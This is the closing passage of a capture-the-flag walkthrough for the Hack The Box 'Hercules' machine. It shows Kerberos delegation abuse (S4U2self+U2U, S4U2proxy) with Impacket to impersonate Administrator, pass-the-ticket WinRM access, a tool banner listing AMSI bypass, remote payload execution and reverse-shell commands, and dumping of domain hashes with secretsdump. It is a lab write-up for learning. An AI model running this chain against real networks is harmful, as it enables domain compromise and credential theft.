[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
[*] Password was changed successfully.
[!] User will need to change their password on next logging because we are using hashes.
```

> *Beware that the obtain TGT session key and change `controlledaccountwithoutSPN`'s NT hash need to do fast cause it automatically refresh really fast.*

Finally we can obtain the delegated service ticket through `S4U2self+U2U`, followed by `S4U2proxy`.

```bash
└─$ getST.py -u2u -impersonate Administrator -spn cifs/dc.hercules.htb -k -no-pass hercules.htb/iis_webserver$ 
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
/home/kali/.local/bin/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2self+U2U
/home/kali/.local/bin/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/.local/bin/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

Here we go, got the ticket of `Administrator`. <br>
&rarr; We can now access into it.

```bash
└─$ export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

```bash
└─$ python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: hercules.htb\Administrator
[*] '-spn' not specified, using HTTP/dc.hercules.htb@hercules.htb
[*] '-dc-ip' not specified, using hercules.htb

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\Administrator\Documents> cd ..\Desktop
PS C:\Users\Administrator\Desktop> dir
PS C:\Users\Administrator\Desktop> cd ..\..
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:37 AM                .NET v4.5                                                             
d-----         12/4/2024  11:37 AM                .NET v4.5 Classic                                                     
d-----        10/17/2025  10:28 PM                Admin                                                                 
d-----         9/24/2025   3:41 AM                Administrator                                                         
d-----         12/4/2024  11:45 AM                ashley.b                                                              
d-----         12/4/2024  11:44 AM                auditor                                                               
d-----         9/23/2025   5:36 PM                natalie.a                                                             
d-r---         12/4/2024  11:26 AM                Public                                                                


PS C:\Users> cd Admin\Desktop
PS C:\Users\Admin\Desktop> dir


    Directory: C:\Users\Admin\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        10/23/2025  12:41 PM             34 root.txt                                                              


PS C:\Users\Admin\Desktop> type root.txt
2f14dexxxxxxxxxxxxxxxxxxxxxxxxxx
```

Pwned the `root.txt` flag

> *Also the hint from the machine info got work where there is not flag in `Administrator` but in `Admin` :D.*

> *And be careful that the flow of from getting `stephen.m` &rarr; `Administrator` need to be straighforward so that it will works, otherwise it will got error so in that case, just redo the step from the begining or create an automate script if we already pwned the machine to have a clear look again the flow. If got some trouble with clock skew just `sudo rdate -n $ip` and it should work fine again :D.*

Now we can [passing-the-ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt#passing-the-ticket) by using `impacket-secretsdump` to dump hashes and LSA secrets.

```bash
└─$ impacket-secretsdump -k -no-pass dc.hercules.htb                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4d4922ac5f690741fd77d8937655a391
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
<SNIP>
[*] Cleaning up...
```

What could we said, really great insane machine that need to go through lots of stuff from outside to exploit vulnerabilities and to get inside and mess things up with bloodhound in order to get the path to pwned that final boss. <br>
Give ourself a big clap as congratulations :>.

![result](/assets/img/hercules-htb-season9/result.png)